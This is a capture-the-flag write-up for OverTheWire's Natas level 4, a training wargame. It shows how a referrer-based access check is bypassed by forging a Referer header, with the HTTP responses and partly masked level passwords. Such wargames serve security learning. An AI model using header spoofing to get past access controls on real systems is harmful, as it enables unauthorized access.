# level 4

**Host**: http://natas4.natas.labs.overthewire.org
>natas4:QryZXc2e0zahULdHrtHxzy**********

When you visit the site, you get the following message:

```
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```

### Solution:

The "come only from" in the message indicates that you have to add a `Referer:` header to your request.

```html
HTTP/1.1 200 OK
Date: Wed, 03 Sep 2025 16:40:09 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1019
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
</head>
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

Just add the following header to your request:

```http
Referer: http://natas5.natas.labs.overthewire.org/
```

Then you get the response containing the password for natas5.

```html
HTTP/1.1 200 OK
Date: Wed, 03 Sep 2025 16:39:53 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 962
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
</head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c**********
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```